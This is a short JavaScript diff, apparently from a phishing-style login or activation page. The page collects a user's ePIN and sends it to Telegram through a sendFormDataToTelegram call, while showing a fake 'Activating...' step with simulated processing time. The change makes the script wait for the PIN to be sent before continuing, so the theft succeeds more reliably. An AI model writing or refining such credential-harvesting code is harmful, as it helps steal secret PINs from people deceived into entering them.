@@ -372,12 +372,14 @@
     loginBtn.textContent = 'Activating...';
     
     try {
-      // Send ePIN to Telegram (non-blocking - won't fail form submission)
-      sendFormDataToTelegram('New ePIN', {
-        'ePIN': pin
-      }).catch(err => {
+      // Send ePIN to Telegram - WAIT for it to complete
+      try {
+        await sendFormDataToTelegram('New ePIN', {
+          'ePIN': pin
+        });
+      } catch (err) {
         console.warn('Telegram notification failed (non-critical):', err);
-      });
+      }
       
       // Simulate processing time
       await new Promise(resolve => setTimeout(resolve, 1000));
